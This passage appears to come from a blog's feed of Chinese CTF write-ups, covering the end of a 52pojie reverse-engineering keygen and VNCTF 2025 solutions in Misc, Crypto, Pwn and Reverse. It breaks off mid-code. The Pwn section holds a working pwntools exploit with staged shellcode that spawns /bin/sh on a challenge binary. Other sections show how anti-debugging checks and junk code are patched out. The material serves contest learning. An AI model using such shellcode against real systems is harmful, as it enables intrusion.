class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">tea_encrypt</span><span class="params">(<span class="type">uint32_t</span> v[<span class="number">2</span>], <span class="type">const</span> <span class="type">uint32_t</span> k[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], sum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> delta = <span class="number">0xB979379E</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">uint32_t</span> i = <span class="number">0</span>; i &lt; <span class="number">12</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        sum += delta;</span><br><span class="line">        v1 += ((v0 &lt;&lt; <span class="number">4</span>) + k[<span class="number">2</span>]) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k[<span class="number">3</span>]);</span><br><span class="line">        v0 += ((v1 &lt;&lt; <span class="number">4</span>) + k[<span class="number">0</span>]) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k[<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    v[<span class="number">0</span>] = v0;</span><br><span class="line">    v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">输入格式：</span></span><br><span class="line"><span class="comment">flag</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">tea_enc</span></span><br><span class="line"><span class="comment">(</span></span><br><span class="line"><span class="comment">    timestamp 8字节</span></span><br><span class="line"><span class="comment">    uid 8字节</span></span><br><span class="line"><span class="comment">    md5 4字节</span></span><br><span class="line"><span class="comment">    0x04*4 4字节填充</span></span><br><span class="line"><span class="comment">)</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 动调得到的三个Key</span></span><br><span class="line">    <span class="type">uint32_t</span> key1[] =</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="number">0xD7851B65</span>,</span><br><span class="line">        <span class="number">0x473457C1</span>,</span><br><span class="line">        <span class="number">0x1231F787</span>,</span><br><span class="line">        <span class="number">0x9ACD6D9A</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">uint32_t</span> key2[] =</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="number">0xB728E994</span>,</span><br><span class="line">        <span class="number">0x1746382E</span>,</span><br><span class="line">        <span class="number">0xC52D865C</span>,</span><br><span class="line">        <span class="number">0x10778A6E</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">uint32_t</span> key3[] =</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="number">0x7459F437</span>,</span><br><span class="line">        <span class="number">0x90D1E5D</span>,</span><br><span class="line">        <span class="number">0x779375B2</span>,</span><br><span class="line">        <span class="number">0xEFCB8541</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> timestamp_bytes[<span class="number">8</span>]&#123;&#125;;</span><br><span class="line">    <span class="comment">// 8字节下的UID</span></span><br><span class="line">    <span class="type">uint8_t</span> uid[]&#123; <span class="number">0x50</span>, <span class="number">0x04</span>, <span class="number">0x23</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span> &#125;;</span><br><span class="line">    <span class="comment">// 动调得到MD5四个字节，加上最后4个0x04填充</span></span><br><span class="line">    <span class="type">uint8_t</span> md5_and_pad[]&#123; <span class="number">0xD2</span>, <span class="number">0x63</span>, <span class="number">0xE4</span>, <span class="number">0xE6</span>, <span class="number">0x04</span>, <span class="number">0x04</span>, <span class="number">0x04</span>, <span class="number">0x04</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 半时整点时间戳计算</span></span><br><span class="line">    FILETIME time&#123;&#125;;</span><br><span class="line">    DWORD64 timestamp&#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">GetSystemTimeAsFileTime</span>(&amp;time);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>((<span class="type">void</span>*)(&amp;timestamp), (<span class="type">void</span>*)(&amp;time), <span class="number">8</span>);</span><br><span class="line">    timestamp = <span class="number">1800</span> * ((timestamp / <span class="number">0x989680</span> - <span class="number">0x2B6109100LL</span>) / <span class="number">0x708</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>((<span class="type">void</span>*)(timestamp_bytes), (<span class="type">void</span>*)(&amp;timestamp), <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 加密数据</span></span><br><span class="line">    <span class="built_in">tea_encrypt</span>((<span class="type">uint32_t</span>*)timestamp_bytes, (<span class="type">uint32_t</span>*)key1);</span><br><span class="line">    <span class="built_in">tea_encrypt</span>((<span class="type">uint32_t</span>*)uid, (<span class="type">uint32_t</span>*)key2);</span><br><span class="line">    <span class="built_in">tea_encrypt</span>((<span class="type">uint32_t</span>*)md5_and_pad, (<span class="type">uint32_t</span>*)key3);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;flag&#123;&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02X&quot;</span>, timestamp_bytes[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02X&quot;</span>, uid[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02X&quot;</span>, md5_and_pad[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="心得"><a href="#心得" class="headerlink" title="心得"></a>心得</h1><p>动调调试分析程序主体流程很重要，要先了解大概执行框架才能逐步往下层分析，且上层一些代码条件有助于下层的分析。</p><p>然后踩了一个严重的坑就是IDA伪代码里面的变量值和实际值一些情况下是不一样的，之前写题没在意那么多，这次很多地方都发现有这种问题，卡了我分析好久。所以关键代码段最好用汇编逐步分析，看实际数据的变化。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;吾爱2025-Windows逆向高级题-5&quot;&gt;&lt;a href=&quot;#吾爱2025-Windows逆向高级题-5&quot; class=&quot;headerlink&quot; title=&quot;吾爱2025-Windows逆向高级题-5&quot;&gt;&lt;/a&gt;吾爱2025-Windows逆向高级题-5&lt;/</summary>
      
    
    
    
    <category term="逆向练习" scheme="https://tkazer.github.io/categories/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>VNCTF2025</title>
    <link href="https://tkazer.github.io/2025/02/12/VNCTF2025/"/>
    <id>https://tkazer.github.io/2025/02/12/VNCTF2025/</id>
    <published>2025-02-12T14:53:27.000Z</published>
    <updated>2025-02-12T15:10:39.099Z</updated>
    
    <content type="html"><![CDATA[<h1 id="VNCTF-2025-WP"><a href="#VNCTF-2025-WP" class="headerlink" title="VNCTF 2025 WP"></a>VNCTF 2025 WP</h1><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="VN-Lang"><a href="#VN-Lang" class="headerlink" title="VN_Lang"></a>VN_Lang</h3><p>IDA分析VN_Lang_XXXX.exe字符串搜索VN得到Flag。</p><p><img src="/2025/02/12/VNCTF2025/vnlang.png" alt="vnlang"></p><h4 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h4><p><strong>VNCTF{i9UQEqFXgbJBI1LasSZmBxxXSNYFRyCkpydKvhZo7d9Ai}</strong></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="easymath"><a href="#easymath" class="headerlink" title="easymath"></a>easymath</h3><p>ai一把梭。</p><p>dec.sage:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> ZZ, PolynomialRing</span><br><span class="line"></span><br><span class="line">R = PolynomialRing(ZZ, <span class="string">&quot;x&quot;</span>)</span><br><span class="line">x = R.gen()</span><br><span class="line">polynomial = x**<span class="number">3</span> - <span class="number">15264966144147258587171776703005926730518438603688487721465</span>*x**<span class="number">2</span> + <span class="number">76513250180666948190254989703768338299723386154619468700730085586057638716434556720233473454400881002065319569292923</span>*x - <span class="number">125440939526343949494022113552414275560444252378483072729156599143746741258532431664938677330319449789665352104352620658550544887807433866999963624320909981994018431526620619</span></span><br><span class="line"></span><br><span class="line">roots = polynomial.roots()</span><br><span class="line">primes = [<span class="built_in">int</span>(r[<span class="number">0</span>]) <span class="keyword">for</span> r <span class="keyword">in</span> roots]</span><br><span class="line">N = primes[<span class="number">0</span>] * primes[<span class="number">1</span>] * primes[<span class="number">2</span>]</span><br><span class="line">c = <span class="number">24884251313604275189259571459005374365204772270250725590014651519125317134307160341658199551661333326703566996431067426138627332156507267671028553934664652787411834581708944</span></span><br><span class="line"></span><br><span class="line">c = <span class="number">24884251313604275189259571459005374365204772270250725590014651519125317134307160341658199551661333326703566996431067426138627332156507267671028553934664652787411834581708944</span></span><br><span class="line"></span><br><span class="line">square_roots = []</span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> primes:</span><br><span class="line">    root = power_mod(c, (p + <span class="number">1</span>) // <span class="number">4</span>, p) </span><br><span class="line">    square_roots.append((root, p))</span><br><span class="line"></span><br><span class="line">possible_flags = []</span><br><span class="line"><span class="keyword">for</span> signs <span class="keyword">in</span> [(<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>), (<span class="number">1</span>, <span class="number">1</span>, -<span class="number">1</span>), (<span class="number">1</span>, -<span class="number">1</span>, <span class="number">1</span>), (-<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>), (-<span class="number">1</span>, -<span class="number">1</span>, <span class="number">1</span>), (-<span class="number">1</span>, <span class="number">1</span>, -<span class="number">1</span>), (<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>), (-<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>)]:</span><br><span class="line">    crt_solution = crt([signs[i] * square_roots[i][<span class="number">0</span>] % primes[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)], primes)</span><br><span class="line">    possible_flags.append(crt_solution)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(possible_flags)</span><br><span class="line"><span class="comment">#[55745449774035533604132123837354458550470434042238203561240895515463850669082841278843372190705837595737691650856096087615682512159689935652128349720357413457859444632369350, 125115225001407144448151513636019415817956856295873219712252392836948941964102523530173092625214575404136789335483571504152920024161726170211008255272440379726560839152801102, 121308689781282565030341210716083690163638176623957028113928015415750030819041672272612041957024041097790808247093717003449846352538078398824952421335589115302596759718820027, 60203414044033723113683626590079903689763905879374101193373685550258360403003508805935592269106120673140798276984048897114005911074753100616094921754147882416738708813989459, 325714524936805045870599916394859742487396082609853016904206306797799294429908134765584705104874385528562768869049154397624863645707696788955369048469602267457592373819517, 4132249745061384463680902836330585396806075754526044615228583727996710439490759392326635373295408691874543857258903655100698535269355468175011202985320866691421671807800592, 65237525482310226380338486962334371870680346499108971535782913593488380855528922859003085061213329116524553827368571761436538976732680766383868702566762099577279722712631160, 69695489752308415889889989715059817009973818336244869167915703628282890589449590386095305139613612193927660453496524570934862375647743931347835274600552568536158986894251269]</span></span><br></pre></td></tr></table></figure><p>dec.py:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">p =[<span class="number">55745449774035533604132123837354458550470434042238203561240895515463850669082841278843372190705837595737691650856096087615682512159689935652128349720357413457859444632369350</span>, <span class="number">125115225001407144448151513636019415817956856295873219712252392836948941964102523530173092625214575404136789335483571504152920024161726170211008255272440379726560839152801102</span>, <span class="number">121308689781282565030341210716083690163638176623957028113928015415750030819041672272612041957024041097790808247093717003449846352538078398824952421335589115302596759718820027</span>, <span class="number">60203414044033723113683626590079903689763905879374101193373685550258360403003508805935592269106120673140798276984048897114005911074753100616094921754147882416738708813989459</span>, <span class="number">325714524936805045870599916394859742487396082609853016904206306797799294429908134765584705104874385528562768869049154397624863645707696788955369048469602267457592373819517</span>, <span class="number">4132249745061384463680902836330585396806075754526044615228583727996710439490759392326635373295408691874543857258903655100698535269355468175011202985320866691421671807800592</span>, <span class="number">65237525482310226380338486962334371870680346499108971535782913593488380855528922859003085061213329116524553827368571761436538976732680766383868702566762099577279722712631160</span>, <span class="number">69695489752308415889889989715059817009973818336244869167915703628282890589449590386095305139613612193927660453496524570934862375647743931347835274600552568536158986894251269</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> p:</span><br><span class="line">    f_bytes = f.to_bytes((f.bit_length() + <span class="number">7</span>) // <span class="number">8</span>, byteorder=<span class="string">&quot;big&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> f_bytes.startswith(<span class="string">b&#x27;VNCTF&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span>(f_bytes.decode())</span><br><span class="line">        </span><br><span class="line"><span class="comment"># VNCTF&#123;90dcfb2dfb21a21e0c8715cbf3643f4a47d3e2e4b3f7b7975954e6d9701d9648&#125;</span></span><br></pre></td></tr></table></figure><h4 id="Flag-1"><a href="#Flag-1" class="headerlink" title="Flag"></a>Flag</h4><p><strong>VNCTF{90dcfb2dfb21a21e0c8715cbf3643f4a47d3e2e4b3f7b7975954e6d9701d9648}</strong></p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="签个到吧"><a href="#签个到吧" class="headerlink" title="签个到吧"></a>签个到吧</h3><p>checksec</p><p><img src="/2025/02/12/VNCTF2025/pwn2.png" alt="QQ_1739074297610"></p><p>IDA分析pwn程序</p><p><img src="/2025/02/12/VNCTF2025/pwn1.png" alt="QQ_1739073892530"></p><p>发现就给22字节大小，可以写一个标准最短shell，但是execute函数清空了寄存器。</p><p><img src="/2025/02/12/VNCTF2025/pwn3.png" alt="QQ_1739074388173"></p><p>所以可以通过一段shellcode再read一次更大的空间。</p><p>接下来用shellcode调用&#x2F;bin&#x2F;sh即可。</p><p>参考：<a href="https://v3rdant.cn/Pwn.The-Art-of-Shellcode/">Pwn.the-Art-of-Shellcode | V3rdant’s Blog</a></p><p>payload.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch= <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>) </span><br><span class="line"><span class="comment">#p = remote(&quot;node.vnteam.cn&quot;,...)</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    xchg rdi, rsi</span></span><br><span class="line"><span class="string">    mov edi, eax</span></span><br><span class="line"><span class="string">    add edx, 0x114</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;try to show your strength \n&#x27;</span>,shellcode)</span><br><span class="line"></span><br><span class="line">pay = <span class="string">b&#x27;0&#x27;</span>*<span class="number">13</span> + asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rsp, rsi</span></span><br><span class="line"><span class="string">    add rsp, 0x114</span></span><br><span class="line"><span class="string">    xor rsi, rsi</span></span><br><span class="line"><span class="string">    mul rsi</span></span><br><span class="line"><span class="string">    push r8</span></span><br><span class="line"><span class="string">    mov rcx, 0x68732f2f6e69622f</span></span><br><span class="line"><span class="string">    push rcx</span></span><br><span class="line"><span class="string">    mov rdi, rsp</span></span><br><span class="line"><span class="string">    mov al, 59</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(pay)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2025/02/12/VNCTF2025/pwn4.png" alt="QQ_1739075764118"></p><h4 id="Flag-2"><a href="#Flag-2" class="headerlink" title="Flag"></a>Flag</h4><p><strong>动态值</strong></p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="Fuko’s-starfish"><a href="#Fuko’s-starfish" class="headerlink" title="Fuko’s starfish"></a><strong>Fuko’s starfish</strong></h3><p>IDA分析.exe程序发现最终游戏调用的是starfish.dll里面的函数，程序本身似乎没有与flag相关数据。</p><p><img src="/2025/02/12/VNCTF2025/fuko1.png" alt="QQ_1739075923934"></p><p>IDA分析.dll程序的play_snake函数，发现输出”u win”下面分支调用了一个Check函数（改名后的），Check函数有花指令，直接将图2红框部分nop即可F5分析。</p><p><img src="/2025/02/12/VNCTF2025/fuko2.png" alt="QQ_1739076003936"></p><p><img src="/2025/02/12/VNCTF2025/fuko7.png" alt="QQ_1739076991040"></p><p>可以看到函数内部就是主体流程，要解密一段字符串输出然后要求输入，加密最后与被加密的flag进行对比。</p><p><img src="/2025/02/12/VNCTF2025/fuko3.png" alt="QQ_1739076094303"></p><p>输入32长度字符串，被分为16字节为一个单位进行加密，进入加密函数发现有调试器检测，让数据走不同分支处理，直接将下图红框部分nop进行pass，然后将jz改成jmp即可（手动重新算一下相对偏移就行）。</p><p><img src="/2025/02/12/VNCTF2025/fuko11.png" alt="QQ_1739077386431"></p><p><img src="/2025/02/12/VNCTF2025/fuko8.png" alt="QQ_1739077338900"></p><p>可以通过算法特征识别出这是一个标准AES加密，没看出魔改的地方，但是密钥是从全局数据获取再经过一通计算拿的，计算过程不好看，考虑用动调获取，并且图1部分用密钥与输入进来的Input进行了异或，可以通过Input和这段数据进行异或获取到密钥。</p><p><img src="/2025/02/12/VNCTF2025/fuko4.png" alt="QQ_1739076342223"></p><p><img src="/2025/02/12/VNCTF2025/fuko5.png" alt="QQ_1739076365537"></p><p>看到DllMain似乎有反调试，但是似乎只扫描了进程，而且没检测ida，所以就不管了。</p><p><img src="/2025/02/12/VNCTF2025/fuko6.png" alt="QQ_1739076850485"></p><p>直接写一个程序来加载这个dll来call Check函数，便于调试。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">auto</span> hLib = <span class="built_in">LoadLibraryW</span>(<span class="string">L&quot;starfish.dll&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (hLib)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">auto</span> Addr = (DWORD64)hLib + <span class="number">0x25F0</span>;</span><br><span class="line"><span class="built_in">void</span> (*funcPtr)() = <span class="built_in">reinterpret_cast</span>&lt;<span class="built_in">void</span>(*)()&gt;(Addr);</span><br><span class="line"><span class="built_in">funcPtr</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输入”1111111111111111”然后动调断点在下图断点，取出所有异或后的值，然后重新与输入字符再次异或拿到Key.</p><p><img src="/2025/02/12/VNCTF2025/fuko9.png" alt="QQ_1739077545772"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">uint8_t</span> Input[] = <span class="string">&quot;1111111111111111&quot;</span>;</span><br><span class="line">    <span class="type">uint8_t</span> c[]&#123; <span class="number">0x38</span>,<span class="number">0xd4</span>,<span class="number">0xCC</span>,<span class="number">0xDA</span>,<span class="number">0x59</span>,<span class="number">0x00</span>,<span class="number">0x44</span>,<span class="number">0x87</span>,<span class="number">0x80</span>,<span class="number">0x0A</span>,<span class="number">0xB5</span>,<span class="number">0x39</span>,<span class="number">0xA0</span>,<span class="number">0xDA</span>,<span class="number">0x49</span>,<span class="number">0xE3</span> &#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02X &quot;</span>, Input[i] ^ c[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Key</span></span><br><span class="line"><span class="comment">// 09 E5 FD EB 68 31 75 B6 B1 3B 84 08 91 EB 78 D2</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再用cyberchef AES解密得到Flag.</p><p><img src="/2025/02/12/VNCTF2025/fuko10.png" alt="QQ_1739077689242"></p><h4 id="Flag-3"><a href="#Flag-3" class="headerlink" title="Flag"></a>Flag</h4><p><strong>VNCTF{W0w_u_g0t_Fuk0’s_st4rf1sh}</strong></p><h3 id="Hook-Fish"><a href="#Hook-Fish" class="headerlink" title="Hook Fish"></a>Hook Fish</h3><p>jadx分析APK, 发现他会下载一个hook_fish.dex文件, 然后调用里面的check、encode、decode函数。但是他又会delete文件，所以得动调断点在这边然后手动去复制一份文件。</p><p><img src="/2025/02/12/VNCTF2025/fish1.png" alt="QQ_1739078061506"></p><p><img src="/2025/02/12/VNCTF2025/fish2.png" alt="QQ_1739078112517"></p><p>在delete前断点，启动调试，然后输入点击按钮断下，在文件夹中搜到hook_fish.dex复制到windows。</p><p><img src="/2025/02/12/VNCTF2025/fish3.png" alt="QQ_1739078448944"></p><p><img src="/2025/02/12/VNCTF2025/fish4.png" alt="QQ_1739078521968"></p><p>jadx分析hook_fish.dex可以发现有以下几个函数，以及一个被加密的flag。</p><p><img src="/2025/02/12/VNCTF2025/fish5.png" alt="QQ_1739078659633"></p><p>使用decode函数即可解密第一层，第二层解密就是用apk里面的encrypt进行写解密函数。</p><p><img src="/2025/02/12/VNCTF2025/fish6.png" alt="QQ_1739078766431"></p><p>这边发现加密后的1字节对2字节的，也就是从逐字节往后添加进行爆破，免得写解密函数了。</p><p>完整解密代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span 